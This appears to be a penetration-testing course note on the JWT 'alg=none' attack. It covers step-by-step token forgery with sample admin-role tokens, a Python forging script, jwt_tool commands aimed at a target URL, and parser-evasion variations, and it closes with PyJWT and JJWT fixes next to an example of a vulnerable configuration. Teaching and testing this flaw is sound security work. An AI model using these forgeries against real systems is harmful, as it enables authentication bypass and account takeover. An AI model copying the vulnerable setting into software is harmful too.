---
tags: [vapt, jwt, intermediate]
difficulty: intermediate
module: "18 - JWT"
topic: "18.04 Algorithm None Attack"
portswigger_labs: ["JWT authentication bypass via flawed signature verification"]
---

# 18.04 — Algorithm None Attack

## The Vulnerability

```
JWT STANDARD DEFINES: "none" as a valid algorithm
  → Token with alg=none requires NO signature!
  
VULNERABLE SERVER BEHAVIOR:
  Server trusts the alg claim in the JWT header
  If alg=none → server skips signature verification!
  Attacker can change ANY payload claim → server accepts it!
  
IMPACT:
  Complete authentication bypass
  Privilege escalation (user → admin)
  Account takeover
```

---

## Attack Steps

```
STEP 1: Capture your own valid JWT:
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoidXNlciJ9.SIGNATURE

STEP 2: Decode header and payload:
  Header:  {"alg":"HS256","typ":"JWT"}
  Payload: {"userId":42,"role":"user"}

STEP 3: Create new header with alg=none:
  {"alg":"none","typ":"JWT"}
  → Base64URL: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

STEP 4: Modify payload as desired:
  {"userId":1,"role":"admin"}
  → Base64URL: eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9

STEP 5: Create forged JWT (NO signature, but trailing dot):
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.
  ↑ Note the trailing dot! (empty signature)

STEP 6: Use forged JWT:
  Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.
  → If accepted → ADMIN ACCESS without knowing any secrets!
```

---

## Python Exploit Script

```python
import base64
import json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    padding = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + '=' * padding)

def forge_none_token(original_jwt, new_payload):
    """Create a JWT with alg=none and custom payload"""
    header = {"alg": "none", "typ": "JWT"}
    
    header_b64 = b64url_encode(json.dumps(header))
    payload_b64 = b64url_encode(json.dumps(new_payload))
    
    # JWT with empty signature (trailing dot)
    return f"{header_b64}.{payload_b64}."

# USAGE:
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoidXNlciJ9.SIG"

# Decode original payload to see what to modify:
payload_part = original.split('.')[1]
decoded = json.loads(b64url_decode(payload_part))
print(f"Original payload: {decoded}")

# Forge with modified payload:
malicious_payload = decoded.copy()
malicious_payload['role'] = 'admin'
malicious_payload['userId'] = 1

forged = forge_none_token(original, malicious_payload)
print(f"\nForged token:\n{forged}")
print("\nTest with:")
print(f"curl https://target.com/admin -H 'Authorization: Bearer {forged}'")
```

---

## JWT Tool (Automated)

```bash
# INSTALL jwt_tool:
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# TEST ALGORITHM NONE:
python3 jwt_tool.py TOKEN -X a
# -X a = exploit algorithm none

# VIEW TOKEN DETAILS:
python3 jwt_tool.py TOKEN

# TAMPER SPECIFIC CLAIM AND USE NONE:
python3 jwt_tool.py TOKEN -X a -T
# -T = tamper mode (prompts to change payload values)

# CHECK FOR VULNERABILITIES (scan mode):
python3 jwt_tool.py TOKEN -t https://target.com/api/admin \
  -rh "Authorization: Bearer JWT" \
  -X all
# Tests multiple JWT attacks automatically
```

---

## Variations to Try

```
ALGORITHM CASE VARIATIONS:
  "alg": "none"
  "alg": "None"
  "alg": "NONE"
  "alg": "nOnE"
  
  Some parsers are case-insensitive!
  Try all variations.

SIGNATURE VARIATIONS:
  Trailing dot (empty sig):  header.payload.
  No trailing dot:           header.payload
  Random garbage as sig:     header.payload.randomstuff
  
  Some libraries only check IF signature matches when alg is NOT none
  Others might accept random signatures for none!

ALG REMOVAL:
  {} as header (no alg field)
  {"typ": "JWT"} (alg field completely missing)
  → Some libraries default to "none" if alg is missing!
```

---

## Fix

```
DEFENSES:
  ✓ NEVER accept "none" algorithm:
    Whitelist expected algorithms explicitly
    Reject anything not in the whitelist
    
  # Python (PyJWT):
  payload = jwt.decode(token, SECRET, algorithms=["HS256"])
  # Explicitly limits to HS256 only — "none" rejected!
  
  # DO NOT USE (vulnerable):
  payload = jwt.decode(token, SECRET, algorithms=["HS256", "none"])
  
  # Java (JJWT):
  Jwts.parserBuilder()
      .setSigningKey(key)
      .build()
      .parseClaimsJws(token);  // Note: parseClaimsJws (not parseClaimsJwt)
  // parseClaimsJws REQUIRES signature, rejects unsigned!
  
  ✓ Don't trust the algorithm from the JWT header for choosing key!
    Server should know which algorithm to expect
    Match header alg against expected → reject if different
```

---

## Related Notes
- [[02 - JWT Structure]] — header structure
- [[05 - RS256 to HS256 Algorithm Confusion]] — related algorithm attack
- [[14 - JWT Cracking with jwt_tool]] — jwt_tool usage
- [[18 - Defense Strong Algorithms Validation Short Expiry]] — fix
